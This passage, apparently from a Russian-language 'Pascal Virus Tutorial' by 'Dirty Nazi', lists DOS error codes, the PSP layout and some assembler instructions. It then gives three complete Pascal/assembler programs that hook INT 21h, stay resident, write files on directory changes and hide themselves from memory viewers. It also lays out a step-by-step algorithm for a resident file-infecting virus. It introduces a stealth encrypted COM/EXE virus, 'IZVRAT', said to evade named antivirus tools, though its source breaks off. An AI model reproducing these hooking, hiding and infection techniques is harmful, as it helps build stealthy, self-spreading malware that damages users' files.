формацию о классе (типе) ошибки и локализует ее.  В большинстве критических
случаев сама программа пользователя анализирует ошибку и предпринимает соот-
ветствующее действие.  Однако пользователь может воспользоваться рекомендаци-
ями по устранению ошибок, возвращаемых системным вызовом X'59', в случае,
если он не понимает специфики ошибки.

  Программы, работающие под управлением ДОС версии 3.0 и выше, поддерживают
расширенные коды ошибок как из INT 24h, так и после INT 21h (когда устанавли-
вается флаг переноса или когда возвращается 0FFh для вызовов, использующих
FCB).


                                  Классы ошибок

  Этот код возвращается в регистре BH вызовом X'59':
       1  выработка ресурса (нет больше FCB, памяти, каналов, номеров
          файлов и т.д.)
       2  временная ситуация: пробуйте повторить (например, был
          заблокирован файл)
       3  авторизованный доступ: вам необходимо иметь большие права
       4  внутренняя ошибка: испорчена ДОС
       5  сбой аппаратуры
       6  системная ошибка: испорчена ДОС
       7  ошибка применения: неверно передано в ДОС, ошибочный запрос и т.д.
       8  ошибка ненахождения (файла или чего-то еще)
       9  ошибка формата: файл или что-то другое неверного формата
          (.EXE файл, диск и т.д.)
      0Ah запрет (возможно, взаимная блокировка файлов)
      0Bh ошибка внешней памяти: неправильный диск, сбой по CRC и т.д.
      0Ch конфликт с уже существующим (например, файлом)
      0Dh ошибка неизвестного класса

                              Рекомендуемые действия

  Этот код возвращается в регистре BL вызовом X'59':
       1  Повторить несколько раз, после чего выдать запрос пользователю,
          продолжать или прекратить работу.
       2  Повторить после паузы, после чего выдать запрос пользователю,
          продолжать или прекратить работу.
       3  Если ошибка при вводе данных пользователем, предложить ему
          повторить ввод.
       4  Прекратить работу.
       5  Немедленно прекратить работу во избежание новых неприятностей.
       6  Игнорировать, ошибка не относится к серьезным.
       7  Повторить после действия пользователя, например, закрыть дисковод,
          вставить бумагу и т.п.


                      Локализация места возникновения ошибки

  Этот код возвращается в регистре CH вызовом X'59':
       1  неизвестно где
       2  блочное устройство, дисковод или кассетный накопитель
       3  (резерв)
       4  символьное устройство
       5  память


           Формат префикса программного сегмента (PSP):
 смещ. длина
  +0  2  код инструкции INT 20h - точка выхода из программы
  +2  2  значение наибольшего доступного параграфа памяти в системе
  +4  1  резерв
  +5  5  FAR CALL к диспетчеру функций ДОС
  +6  2  ТОЛЬКО для .COM-файлов - количество байт доступной памяти в данном
         сегменте
 +0Ah  4  адрес перехода по завершению (см. INT 22h)
 +0Eh  4  адрес обработчика INT 23h
 +12h  4  адрес обработчика INT 24h
 +16h  2  сегмент PSP родительского процесса
 +2Ch  2  сегментный адрес среды ДОС
 +2Eh  4  SS:SP процесса
 +32h  2  максимальное число открытых файлов (ДОС 3.x)
 +36h  4  адрес таблицы открытых файлов (ДОС 3.x)
 +50h  3  обращение к диспетчеру системных вызовов
 +5Ch 10h место для FCB файла - 1-го параметра в командной строке
 +6Ch 10h место для FCB файла - 2-го параметра в командной строки
 +80h  1  к-во байт остатка командной строки, этот же адрес устанавливается в
         качестве стандартного значения DTA
 +81h 7Fh остаток командной строки

   Длина PSP составляет 100h байт, со смещения 100h начинается сама
 программа.

        Примечания:

     1) Блоки управления файлами (FCB), расположенные по смещениям 5Ch и 6Ch
        в PSP заполняются в соответствии с параметрами командной строки.
        При этом если соответствующий параметр включает имя каталога, в FCB
        заносится только код драйвера, имя файла формируется неправильно.

     2) Остаток командной строки, начинающийся со смещения 81h, содержит
        символы командной строки после имени команды, включая все пробелы и
        разделители.  Если командная строка включает параметры
        переназначения в ДОС (на них указывают символы > и <), то они не
        помещаются в остаток командной строки, передаваемый программе.

  Строкой ASCIIZ называется последовательность символов ASCII,
заканчивающаяся байтом со значением 00h. Hапример,
Var
   Str : String;

begin
     .....
         Str:='C:\FILE.EXE' + #0;
         { Str теперь - строка ASCIIZ }
     .....
end.

        Еще один момент - в примерах резидентных программ и
исходнике вируса используются ассемблерные инструкции, так вот, чтобы
Вы не говорили, что, мол, я, по поводу ассемблера ничего не объяснил,
приведу выдранные из Norton Guide "Язык Ассемблер" описания инструкций,
использованных в примерах и вирусе:

XOR destination,source

Logic:    destination  destination XOR source

XOR performs a bit-by-bit "exclusive or" on its two operands, and
returns the result in the destination operand.  The operands may be
bytes or words.

OR destination,source

Logic:    destination  destination OR source

    OR performs a bit-by-bit logical inclusive OR operation on its
    operands and returns the result to destination.  The operands may be
    words or bytes.

AND destination,source

          Logic:    destination  destination AND source

    AND performs a bit-by-bit logical AND operation on its operands and
    stores the result in destination. The operands may be words or bytes.

MOV destination,source

          Logic:    destination  source

    MOV copies a byte or word from the source into the destination.

   Operands                  Clocks   Transfers  Bytes   Example
                           byte(word)
   register, register          2          -        2     MOV BX,CX
   memory, accumulator       10(14)       1        3     MOV MEM_DEST,AL
   accumulator, memory       10(14)       1        3     MOV AX,MEM_SOURCE
   memory, register        9(13) + EA     1       2-4    MOV MEM_DEST,BX
   register, memory        8(12) + EA     1       2-4    MOV BX,MEM_SOURCE
   register, immediate         4          -       2-3    MOV BX,0F6CDh
   memory, immediate      10(14) + EA     1       3-6    MOV MASK,0F6CDh
   seg-reg, reg16              2          -        2     MOV DS,BX
   seg-reg, mem16          8(12) + EA     1       2-4    MOV DS,SEGMENT_VAL
   reg16, seg-reg              2          -        2     MOV BP,SS
   memory, seg-reg         9(13) + EA     1       2-4    MOV CODE_VAR,CS

PUSH source

          Logic:    SP  SP - 2
                    (SP)  source

    PUSH decrements SP by 2, then copies the operand to the new top of
    stack. The source of a PUSH instruction cannot be an 8-bit register.

POP destination

          Logic:    destination  (SP)
                    SP  SP + 2

    POP transfers the word at the top of the stack to the destination
    operand, then increments SP by 2 to point to the new top of stack.

PUSHF            Push Flags onto Stack               Flags: not altered

          Logic:    SP  SP - 2
                    (SP)  flag-register

    PUSHF decrements SP by 2, then transfers the flags register to the new
    top of stack.

POPF             POP Flags from the Stack            Flags: O D I T S Z A P C
                                                            r r r r r r r r r
          Logic:    flag-register  (SP)
                    SP  SP + 2

    POPF transfers the word at the top of the stack to the flags register,
    replacing the old flags, then increments SP by 2 to point to the new
    top of stack.

IN accumulator,port

          Logic:    accumulator  (port)

    IN transfers a byte or a word from a port to AL or AX. The port may be
    specified by an immediate byte value (for ports 0 through 255) or by
    the DX register (allowing access to all ports).

OUT port,accumulator

          Logic:    (port)  accumulator

    OUT transfers a byte or a word from AL or AX to the specified port.
    The port may be specified with an immediate byte constant (allowing
    access to ports 0 through 255) or with a word value in DX (allowing
    access to ports 0 through 65,535).

LDS  destination,source

          Logic:    DS  (source + 2)
                    destination  (source)

    LDS loads into two registers the 32-bit pointer variable found in
    memory at source. LDS stores the segment value (the higher order word
    of source) in DS and the offset value (the lower order word of source)
    in the destination register. The destination register may be any any
    16-bit general register (that is, all registers except segment
    registers).


INT interrupt number

          Logic:    PUSHF                  ; Push flags onto stack
                    TF  0                 ; Clear Trap Flag
                    IF  0                 ; Disable Interrupts
                    CALL FAR (INT*4)       ; Call the interrupt handler

    INT pushes the flags register, clears the Trap and Interrupt-enable
    Flags, pushes CS and IP, then transfers control to the interrupt
    handler specified by the interrupt-num.  If the interrupt handler
    returns using an IRET instruction, the original flags are restored.

IRET

    IRET returns control from an interrupt routine to the point where the
    interrupt occurred, by popping IP, CS, and the Flag registers.

CMP destination,source

          Logic:    Flags set according to result of
                       (destination - source)

    CMP compares two numbers by subtracting the source from the
    destination and updates the flags. CMP does not change the source or
    destination. The operands may be bytes or words.

JNE short-label

          Jump Condition:  Jump if ZF = 0

    Used after a CMP or SUB instruction, JNE transfers control to short-
    label if the first operand is not equal to the second. The target of
    the jump must be within -128 to +127 bytes of the next instruction.

JZ short-label

          Jump Condition: Jump if ZF = 1

    Used after a CMP or SUB instruction, JE transfers control to short-
    label if the first operand is equal to the second operand. The target
    of the jump must be within -128 to +127 bytes of the next instruction.

JMP target

          Jump Condition:  Jump always

    JMP always transfer control to the target location. Unlike CALL, JMP
    does not save IP, because no RETurn is expected. An intrasegment JMP
    may be made either through memory or through a 16-bit register; an
    intersegment JMP can be made only through memory.

JC short-label

          Jump Condition:  Jump if CF = 1

    JC transfers control to short-label if the Carry Flag is set. The
    target of the jump must be within -128 to +127 bytes of the next
    instruction.

CALL procedure name

          Logic:    if FAR CALL (inter-segment)
                        PUSH CS
                        CS  dest_seg
                    PUSH IP
                    IP  dest_offset

    CALL transfers control to a procedure that can either be within the
    current segment (a NEAR procedure) or outside it (a FAR procedure).
    The two types of CALLs result in different machine instructions, and
    the RET instruction that exits from the procedure must match the type
    of the CALL instruction (the potential for mismatch exists if the
    procedure and the CALL are assembled separately).

SUB destination, source

          Logic:    destination  destination - source

    SUB subtracts the source operand from the destination operand and
    stores the result in destination. Both operands may be bytes or words,
    and both may signed or unsigned binary numbers.

DEC destination

          Logic:    destination  destination - 1

    This instruction decrements the destination by one. The destination
    operand, which may be either a word or a byte, is treated as an
    unsigned binary number.


     Для примера резидентности в Паскале приведу исходник программы,
которая перехватывает int 21h, становится резидентном и пищит при каждом
вызове функции int 21h 3bh ("Установить текущий каталог"). Кстати,
пока я сейчас это пишу, прога висит в памяти и пищит при каждой
смене каталога. И что самое удивительное, ни разу еще не повисла! ;)

{$M 2048,0,0}
Uses Dos; { Используем только модуль ДОС (не считая System),
            остальные нам нафиг не нужны, да и памяти жрут
            немеряно }

 Var
  OldInt21h : Pointer; { Указатель на адрес оригинального
                         обработчика int 21h}
  Regs      : Registers; { Для проверки на наличие копии в памяти }

procedure Int21h; Assembler; { наш обработчик int 21h }
  asm
     pushf                   { сохранить флаги в стек }
     cmp ax, 0c0feh          { сравниваем AX cо словом 0c0feh - если
                               в AX при вызове int 21h находится это
                               слово, считаем, что вызов делается из
                               нерезидентной части нашей программы
                               для проверки на наличие копии программы
                               в памяти }
     jnz @1                  { если AX не равен 0c0feh - переходим
                               на метку @1 }
     mov ax, 1234h           { если равен - кладем в AX слово 1234h,
                               чтобы наша нерезидентная часть знала,
                               что программа уже резидента }
     popf                    { восстанавливаем флаги из стека }
     retf 2                  { выходим из обработчика }
@1:
     cmp ah, 3bh             { сравниваем AH с 3bh (функция "Установить
                               текущий каталог) }
     jnz @2                  { если вызывается не эта функция, то
                               переходим на метку @2 }
     push ax                 { если вызвана ф-ция 3bh, сохраняем в
                               стеке AX (потому что для того, чтобы
                               пикнуть, нам надо будет положить в
                               AL 07h, и тем самым испортить содер-
                               жимое сего регистра) }
     mov al,07h              { кладем в AL это самое 07h (символ, который
                               при выводе его на экран издает писк) }
     int 29h                 { вызываем прерывание 29h (DOS fast put
                               char) - быстрый вывод на экран символа
                               из AL, то бишь пищим }
     pop ax                  { восстанавливаем AX }
@2:
     popf                    { восстанавливаем флаги }
     int 0e4h                { вызываем оригинальный обработчик int 21h,
                               который мы сохранили в int 0e4h (неисполь-
                               зуемое прерывание) }
     retf 2                  { после того, как оригинальный int 21h
                               отработал, он возвращает управление на
                               эту комманду, и мы выходим из нашего
                               обработчика, передавая управление выз-
                               вавшей нас программе }
     db '(c) Dirty Nazi. For Pascal Virus Tutorial.'
                             { А это копирайт, который будет и в EXE
                               файле на диске, и в памяти, так как строка
                               входит в процедуру обработки прерывания,
                               но на эту строку управление никогда не
                               передается, посему боятся глюков здесь нам
                               нечего }
  end; { конец нашего обработчика int 21h }

begin      { * MAIN * }  { Основной модуль программы }
    Regs.AX:=$c0fe;      { Кладем в AX слово 0c0feh }
    Intr($21,Regs);      { Вызываем int 21h }
    If Regs.AX <> $1234 Then { Если регистр AX после вызова int 21h не
                               равен слову 1234h, то бишь если наш
                               обработчик int 21h еще не установлен,
                               считаем, что программы еще нет в памяти,
                               и приступаем к инсталляции резидентной
                               части }
   begin
       SwapVectors;          { возвращаем системе захваченные Паскалем
                               вектора прерываний }
       GetIntVec($21,OldInt21h); { получаем адрес вектора int 21h }
       SetIntVec($E4,OldInt21h); { перемещаем полученный адрес вектора
                                   int 21h на место вектора int 0e4h,
                                   то есть теперь для вызова оригиналь-
                                   ного int 21h надо вызвать int 0e4h }
       SetIntVec($21,Addr(Int21h)); { Вешаем на int 21h свою процедуру
                                      обработки прерывания }
       Keep(0);                     { И выполняем процедуру "Закончить и
                                      остаться резидентом" }
   end Else                        { Иначе, если в AX при вызове int 21h
                                     таки оказалось слово 1234h, считаем,
                                     что копия программы уже есть в памяти,
                                     и чтобы два раза в память не садиться, }
   WriteLn('Already in memory!'^g); { сообщаем, что копия проги уже есть в
                                      памяти, и возвращаем управление в ДОС }
end.

     НО! Оказалось, что просто остаться резидентом, перехватив без
глюков int 21h - это еще не решение проблемы. При попытке записи на
диск из резидента винт дико начинал шуршать и подмигивать, и все
намертво висло. Решение этой проблемы нашел Int O`Dream. Как оказалось,
все висло из-за того, что Паскаль терял DS (сегмент данных) текущей
(то бишь резидентной нашей) программы, и из-за этого происходили глюки
при попытке утворить любые операции с диском. А раз Паскаль теряет DS,
то что надо сделать? Правильно - перед дисковыми операциями подсовывать
ему нужный DS. А как же узнать этот самый DS? Очень просто - хранить
его где-нибудь в памяти. Ниже идет исходник программы, которая перехваты-
вает int 21h, становится резидентом и привызове функции 3bh пищит и
создает в текущем каталоге файла DirInfo с текстом "Dirty Nazi was
here". DS восстанавливается следующим образом: при инсталляции программы
в память адрес константы DNazi (созданной специально для целей сохранения
DS) сохраняется в векторе int 0e3h (неиспользуемое прерывание) и перед
началом дисковых операций из резидента помещается из int 0e3h в DS.
Принцип простой - константа находится в сегменте данных програм-
мы (DS - Data Segment), соответственно, зная адрес константы, мы
знаем DS резидента.


{$M 2048,0,0}
Uses Dos; { Используем только модуль ДОС (не считая System),
            остальные нам нафиг не нужны, да и памяти жрут
            немеряно }

Const
      DNazi : Array [1..5] Of Char = ('D','N','a','z','i');
      { константа, по которой мы будем определять DS }

 Var
  OldInt21h : Pointer; { Указатель на адрес оригинального
                         обработчика int 21h}
  Regs      : Registers; { Для проверки на наличие копии в памяти }

procedure File_Create; { процедура, которая вызывается из нашего обработчика
                         int 21h для пикания и создания файла DIRINFO }
 Var F : Text;
 begin
     asm
         xor ax,ax     { чтобы подсунуть Паскалю нужный DS, обнуляем AX }
         mov ds,ax     { теперь DS равно нулю }
{

LDS  destination,source

          Logic:    DS  (source + 2)
                    destination  (source)

    LDS loads into two registers the 32-bit pointer variable found in
    memory at source. LDS stores the segment value (the higher order word
    of source) in DS and the offset value (the lower order word of source)
    in the destination register. The destination register may be any any
    16-bit general register (that is, all registers except segment
    registers).

}
         lds dx,ds:[0e3h*4] { восстанавливаем DS, сохраненный в int 0e3h }
         mov al,07h         { пищим (см. предыдущий исходник) }
         int 29h
     end;

  Assign(F,'DIRINFO');      { связываем файловую переменную с файлом
                              DIRINFO в текущем каталоге }
  Rewrite(F);               { открываем его на запись }
  Write(F,'Dirty Nazi was here'); { вписываем в него фразу }
  Close(F);                 { и закрываем файл }

 end;  { конец процедуры file_create }

procedure Int21h; Assembler; { наш обработчик int 21h }
  asm
     pushf                   { сохранить флаги в стек }
     cmp ax, 0c0feh          { сравниваем AX cо словом 0c0feh - если
                               в AX при вызове int 21h находится это
                               слово, считаем, что вызов делается из
                               нерезидентной части нашей программы
                               для проверки на наличие копии программы
                               в памяти }
     jnz @1                  { если AX не равен 0c0feh - переходим
                               на метку @1 }
     mov ax, 1234h           { если равен - кладем в AX слово 1234h,
                               чтобы наша нерезидентная часть знала,
                               что программа уже резидента }
     popf                    { восстанавливаем флаги из стека }
     retf 2                  { выходим из обработчика }
@1:
     cmp ah, 3bh             { сравниваем AH с 3bh (функция "Установить
                               текущий каталог) }
     jnz @2                  { если вызывается не эта функция, то
                               переходим на метку @2 }
     popf                    { восстанавливаем флаги }
     int 0e4h                { выполняем оригинальный int 21h, сохраненный
                               в int 0e4h, дабы выполнилась функция
                               "Установить текущий каталог" }
     push es                 { после выполнения оригинального int 21h }
     push ds                 { сохраняем ES и DS }
     db 60h                  { и все остальные регистры (db 60h -
                               инструкция ассемблера pusha) }
     pushf                   { сохраняем флаги }
     call file_create        { вызываем нашу процедуру file_create }
     popf                    { после выполнения прооцедуры file_create }
                             { востанавливаем флаги }
     db 61h                  { восстанавливаем все регистры, сохраненные
                               командой pusha (db 61h - инструкция popa) }
     pop ds                  { восстанавливаем DS }
     pop es                  { и ES }
     retf 2                  { и выходим из обработчика }
@2:
     popf                    { восстанавливаем флаги }
     int 0e4h                { вызываем оригинальный обработчик int 21h,
                               который мы сохранили в int 0e4h (неисполь-
                               зуемое прерывание) }
     retf 2                  { после того, как оригинальный int 21h
                               отработал, он возвращает управление на
                               эту комманду, и мы выходим из нашего
                               обработчика, передавая управление выз-
                               вавшей нас программе }
     db '(c) Dirty Nazi. For Pascal Virus Tutorial.'
                             { А это копирайт, который будет и в EXE
                               файле на диске, и в памяти, так как строка
                               входит в процедуру обработки прерывания,
                               но на эту строку управление никогда не
                               передается, посему боятся глюков здесь нам
                               нечего }
  end; { конец нашего обработчика int 21h }

begin      { * MAIN * }  { Основной модуль программы }
    Regs.AX:=$c0fe;      { Кладем в AX слово 0c0feh }
    Intr($21,Regs);      { Вызываем int 21h }
    If Regs.AX <> $1234 Then { Если регистр AX после вызова int 21h не
                               равен слову 1234h, то бишь если наш
                               обработчик int 21h еще не установлен,
                               считаем, что программы еще нет в памяти,
                               и приступаем к инсталляции резидентной
                               части }
   begin
       SwapVectors;          { возвращаем системе захваченные Паскалем
                               вектора прерываний }
       GetIntVec($21,OldInt21h); { получаем адрес вектора int 21h }
       SetIntVec($E4,OldInt21h); { перемещаем полученный адрес вектора
                                   int 21h на место вектора int 0e4h,
                                   то есть теперь для вызова оригиналь-
                                   ного int 21h надо вызвать int 0e4h }
       SetIntVec($21,Addr(Int21h)); { Вешаем на int 21h свою процедуру
                                      обработки прерывания }
       SetIntVec($E3,Addr(DNazi)); { запоминаем адрес константы
                                     DNazi (сегмент/смещение) в
                                     int 0e3h (неиспользуемое прерывание) }
       Keep(0);                     { И выполняем процедуру "Закончить и
                                      остаться резидентом" }
   end Else                        { Иначе, если в AX при вызове int 21h
                                     таки оказалось слово 1234h, считаем,
                                     что копия программы уже есть в памяти,
                                     и чтобы два раза в память не садиться, }
   WriteLn('Already in memory!'^g); { сообщаем, что копия проги уже есть в
                                      памяти, и возвращаем управление в ДОС }
end.

        Однако! Кроме перехвата int 21h и записи на диск нам необходимо
"раствориться" в памяти, сделать так, чтобы нас нельзя было увидеть с
помощью стандартных средств просмотра памяти (MEM etc.). Для ассемблер-
ного вируса это довольно легко, в Паскале же приходится дико извращаться,
скрываясь в памяти уже после того, как наша программа вернула управление
вызвавшему ее процессу. "Но как же?" - спросите Вы. "Ведь наша программа
уже отработала". На это и существует префикс программного сегмента
(PSP), в котором содержится адрес, на который передается управле-
ние после завершения программы.

            Формат префикса программного сегмента (PSP):
 смещ. длина
   +0  2  код инструкции INT 20h - точка выхода из программы
   +2  2  значение наибольшего доступного параграфа памяти в системе
   +4  1  резерв
   +5  5  FAR CALL к диспетчеру функций ДОС
   +6  2  ТОЛЬКО для .COM-файлов - количество байт доступной памяти в данном
          сегменте
 +0Ah  4  адрес перехода по завершению (см. INT 22h)
 +0Eh  4  адрес обработчика INT 23h
 +12h  4  адрес обработчика INT 24h
 +16h  2  сегмент PSP родительского процесса
 +2Ch  2  сегментный адрес среды ДОС
 +2Eh  4  SS:SP процесса
 +32h  2  максимальное число открытых файлов (ДОС 3.x)
 +36h  4  адрес таблицы открытых файлов (ДОС 3.x)
 +50h  3  обращение к диспетчеру системных вызовов
 +5Ch 10h место для FCB файла - 1-го параметра в командной строке
 +6Ch 10h место для FCB файла - 2-го параметра в командной строки
 +80h  1  к-во байт остатка командной строки, этот же адрес устанавливается в
          качестве стандартного значения DTA
 +81h 7Fh остаток командной строки

    Длина PSP составляет 100h байт, со смещения 100h начинается сама
 программа.

         Примечания:

      1) Блоки управления файлами (FCB), расположенные по смещениям 5Ch и 6Ch
         в PSP заполняются в соответствии с параметрами командной строки.
         При этом если соответствующий параметр включает имя каталога, в FCB
         заносится только код драйвера, имя файла формируется неправильно.

      2) Остаток командной строки, начинающийся со смещения 81h, содержит
         символы командной строки после имени команды, включая все пробелы и
         разделители.  Если командная строка включает параметры
         переназначения в ДОС (на них указывают символы > и <), то они не
         помещаются в остаток командной строки, передаваемый программе.

        Перед выполнением процедуры Keep мы получаем адрес PSP нашей
программы, в место, где хранится адрес возврата управления, инсталлируем
процедуру Hide, которая спрячет наш резидент в памяти, объявив его
"окружением ДОС'а", а в конец самой процедуры Hide заносим jump (переход)
на настоящий адрес возврата управления. Выполняется процедура Keep,
управление переходит на процедуру Hide. И все - резидента в памяти не
видно.


{$M 2048,0,0}
Uses Dos; { Используем только модуль ДОС (не считая System),
            остальные нам нафиг не нужны, да и памяти жрут
            немеряно }

Const
      DNazi : Array [1..5] Of Char = ('D','N','a','z','i');
      { константа, по которой мы будем определять DS }

 Var
  OldInt21h : Pointer; { Указатель на адрес оригинального
                         обработчика int 21h}
  Regs      : Registers; { Для проверки на наличие копии в памяти }

procedure File_Create; { процедура, которая вызывается из нашего обработчика
                         int 21h для пикания и создания файла DIRINFO }
 Var F : Text;
 begin
     asm
         xor ax,ax     { чтобы подсунуть Паскалю нужный DS, обнуляем AX }
         mov ds,ax     { теперь DS равно нулю }

         lds dx,ds:[0e3h*4] { восстанавливаем DS, сохраненный в int 0e3h }
         mov al,07h         { пищим (см. предыдущий исходник) }
         int 29h
     end;

  Assign(F,'DIRINFO');      { связываем файловую переменную с файлом
                              DIRINFO в текущем каталоге }
  Rewrite(F);               { открываем его на запись }
  Write(F,'Dirty Nazi was here'); { вписываем в него фразу }
  Close(F);                 { и закрываем файл }

 end;  { конец процедуры file_create }

procedure Int21h; Assembler; { наш обработчик int 21h }
  asm
     pushf                   { сохранить флаги в стек }
     cmp ax, 0c0feh          { сравниваем AX cо словом 0c0feh - если
                               в AX при вызове int 21h находится это
                               слово, считаем, что вызов делается из
                               нерезидентной части нашей программы
                               для проверки на наличие копии программы
                               в памяти }
     jnz @1                  { если AX не равен 0c0feh - переходим
                               на метку @1 }
     mov ax, 1234h           { если равен - клавдем в AX слово 1234h,
                               чтобы наша нерезидентная часть знала,
                               что программа уже резидента }
     popf                    { восстанавливаем флаги из стека }
     retf 2                  { выходим из обработчика }
@1:
     cmp ah, 3bh             { сравниваем AH с 3bh (функция "Установить
                               текущий каталог) }
     jnz @2                  { если вызывается не эта функция, то
                               переходим на метку @2 }
     popf                    { восстанавливаем флаги }
     int 0e4h                { выполняем оригинальный int 21h, сохраненный
                               в int 0e4h, дабы выполнилась функция
                               "Установить текущий каталог" }
     push es                 { после выполнения оригинального int 21h }
     push ds                 { сохраняем ES и DS }
     db 60h                  { и все остальные регистры (db 60h -
                               инструкция ассемблера pusha) }
     pushf                   { сохраняем флаги }
     call file_create        { вызываем нашу процедуру file_create }
     popf                    { после выполнения прооцедуры file_create }
                             { востанавливаем флаги }
     db 61h                  { восстанавливаем все регистры, сохраненные
                               командой pusha (db 61h - инструкция popa) }
     pop ds                  { восстанавливаем DS }
     pop es                  { и ES }
     retf 2                  { и выходим из обработчика }
@2:
     popf                    { восстанавливаем флаги }
     int 0e4h                { вызываем оригинальный обработчик int 21h,
                               который мы сохранили в int 0e4h (неисполь-
                               зуемое прерывание) }
     retf 2                  { после того, как оригинальный int 21h
                               отработал, он возвращает управление на
                               эту комманду, и мы выходим из нашего
                               обработчика, передавая управление выз-
                               вавшей нас программе }
     db '(c) Dirty Nazi. For Pascal Virus Tutorial.'
                             { А это копирайт, который будет и в EXE
                               файле на диске, и в памяти, так как строка
                               входит в процедуру обработки прерывания,
                               но на эту строку управление никогда не
                               передается, посему боятся глюков здесь нам
                               нечего }
  end; { конец нашего обработчика int 21h }

 procedure Hide; Assembler; { прячет нашу резидентную программу в памяти }
   asm
     push es
     push ax
     mov ax,0000
     dec ax
     mov es,ax
     mov word ptr es:[1],70h { выставляем себя что мы - окружение ДОС'а :) }
     pop ax
     pop es
     db 0eah
     dw 0
     dw 0
   end;

begin      { * MAIN * }  { Основной модуль программы }
    Regs.AX:=$c0fe;      { Кладем в AX слово 0c0feh }
    Intr($21,Regs);      { Вызываем int 21h }
    If Regs.AX <> $1234 Then { Если регистр AX после вызова int 21h не
                               равен слову 1234h, то бишь если наш
                               обработчик int 21h еще не установлен,
                               считаем, что программы еще нет в памяти,
                               и приступаем к инсталляции резидентной
                               части }
   begin
       SwapVectors;          { возвращаем системе захваченные Паскалем
                               вектора прерываний }
       GetIntVec($21,OldInt21h); { получаем адрес вектора int 21h }
       SetIntVec($E4,OldInt21h); { перемещаем полученный адрес вектора
                                   int 21h на место вектора int 0e4h,
                                   то есть теперь для вызова оригиналь-
                                   ного int 21h надо вызвать int 0e4h }
       SetIntVec($21,Addr(Int21h)); { Вешаем на int 21h свою процедуру
                                      обработки прерывания }
       SetIntVec($E3,Addr(DNazi)); { запоминаем адрес константы DNazi
                                     в int 0e3h }
       Regs.AH:=$62;                { пoлyчaeм aдpec пpeфикca пpoгpaммнoгo }
       Intr($21 , Regs);            { ceгмeнтa (PSP) для того, чтобы засунуть
                                      вместо адреса возврата управления нашей
                                      программой процедуру hide, которая
                                      сделает наш резидент окружением



                                  ДОС'а }

       { Инсталлируем процедуру Hide }

       MemW[Seg(Hide):Ofs(Hide)+3]:=Regs.BX;
       MemW[Seg(Hide):Ofs(Hide)+18]:=MemW[Regs.BX:$A];
       MemW[Seg(Hide):Ofs(Hide)+20]:=MemW[Regs.BX:$C];
       MemW[Regs.BX:$A]:=Ofs(Hide);
       MemW[Regs.BX:$C]:=Seg(Hide);

       { теперь, после выполнения процедуры Keep управление получит
         процедура Hide, и спрячет наш резидент в памяти }

       Keep(0);                     { И выполняем процедуру "Закончить и
                                      остаться резидентом" }
   end Else                        { Иначе, если в AX при вызове int 21h
                                     таки оказалось слово 1234h, считаем,
                                     что копия программы уже есть в памяти,
                                     и чтобы два раза в память не садиться, }
   WriteLn('Already in memory!'^g); { сообщаем, что копия проги уже есть в
                                      памяти, и возвращаем управление в ДОС }
end.

        Вот, вобственно, и вся теория. Int 21h мы уже перехватывать умеем,
нга диск записаться - нет проблем, да и в памяти нас не видно. Самое время
перейти к написанию резидентных вирусов.


2. Резидентный parasitic вирус.


        Описание сего вируса дано в исходнике, посему долго я на эту
тему распростаняться не буду. Отмечу только, что в резидентном вирусе
для экономии времени вместо метки, показывающей, что файл уже инфици-
рован, лучше использовать поле даты/времени (не надо постоянно от
крывать файл для проверки). В данном вирусе инфицированные файлы
имеют дату 21/05/??. Примерный алгоритм работы такого вируса:

        Часть А: Нерезидентная часть.
        1.  Открыть файл, с которого мы получили управление.
        2.  Считать в буфер тело вируса.
        3.  Считать в буфер начало инфицированной программы,
            расположенное в конце файла.
        4.  Записать считанное начало программы поверх кода
            вируса в начало файла.
        5.  Усечь файл до его оригинальной длины (то бишь удалить
            кусок кода с конца файла, по длине равный длине тела
            вируса).
        6.  Закрыть файл.
        7.  Процедурой Exec запустить файл, с которого мы стартовали,
            (ParamStr(0)) на исполнение - выполнится инфицированная
            программа.
        8.  По завершению работы программы опять открыть файл, с
            которого мы стартовали.
        9.  Вписать в начало файла тело вируса, а оригинальное начало
            программы опять вписать в конец файла.
        10. Закрыть файл.
        11. Проверить память на наличие копии вируса.
        12. Если копия вируса находится в памяти, вернуть управление
            в ДОС.
        13. Перехватить прерывания, необходимые для работы вируса.
        14. Выполнить процедуру Keep - остаться резидентом.

        Часть B: Резидентная часть (выполняется все время до перезагрузки
                                    компьютера)
        1.  Проверить условия для заражения (вызвана определенная
            функция прерывания etc.)
        2.  Если условия подходящие, перейти к пункту 4.
        3.  Вернуть управление на оригинальный обработчик прерывания.
        4.  Найти файл-жертву.
        5.  Проверить, не инфицирован ли найденный файл нашим вирусом.
        6.  Если инфицирован, перейти к пункту 4.
        7.  Открыть файл на запись.
        8.  Считать в буфер начало файла (принцип точно такой же,
            как в нерезидентном parasitic вирусе, описанном в части
            B пункте 2.2.2.)
        9.  Вписать в начало файла тело вируса, оригинальное начало
            файла записать в конец.
        10. Установить метку, указывающую, что файл уже инфицирован.
        11. Закрыть файл.
        12. Перейти к пункту 3.

        Вот, собственно, и все, остальное Вы увидите в исходнике.


        IZVRAT - peзидeнтный cтeлc виpyc c элeмeнтaми шифpoвaния,
 зapaжaющий *.COM *.EXE фaйлы. He oбнapyживaeтcя DrWEB'oм пpи пapaнoикe
 ни в пaмяти, ни нa диcкe. Инфициpoвaнныe фaйлы нe лeчaтcя Adinf Cure
 Module, пocкoлькy шифpyeтcя чacть зapaжaeмoгo фaйлa.

XREF-TO: Часть D. Пункт 1. Защита от выкусывания тела вируса из программы.

 Caм AdInf нa  зapaжeнныe фaйлы  нe  кpичит,  тaк кaк вмecтe c измeнeниeм
 длины мoдифициpyeтcя и дaтa фaйлa. Taкoe нaзвaниe виpyc пoлyчил пoтoмy,
 чтo этo и ecть caмый нacтoящий извpaт. Mнe в пpиpoдe eщe нe вcтpeчaлиcь
 peзидeнтныe cтeлc виpycы, нaпиcaнныe нa Паскале, да и вообще из рези-
 дентных вирусов, написаных на ЯВУ, мне в природе встречался только
 Sentinel, нo я бoльшe cклoняюcь к мнeнию, чтo oн нaпиcaн нa C. WEB,
 Aidstest и пpoчиe нa  зapaжeниe  нe  peaгиpyют,  и  этo  пpaвильнo, дopoгиe
 тoвapищи (c) M.C. Гopбaчeв. Дa, coбcтвeннo, нe бyдy мнoгo pacпpocтpaнятьcя,
 вeдь пepeд тoбoй иcхoдник. Bпepeд!

P.S.  Bыpaжaю oгpoмнyю блaгoдapнocть Int O`Dream'y - бeз eгo yчacтия этo
      пpoизвeдeниe никoгдa бы нe yвидeлo кoмпьютepнoгo миpa...


{$M 2048 , 0 , 0}   { 2K stack, no heap }
Uses Dos;
Const
     Buf   : Array [1..6] of Char = ('I','Z','V','R','A','T');
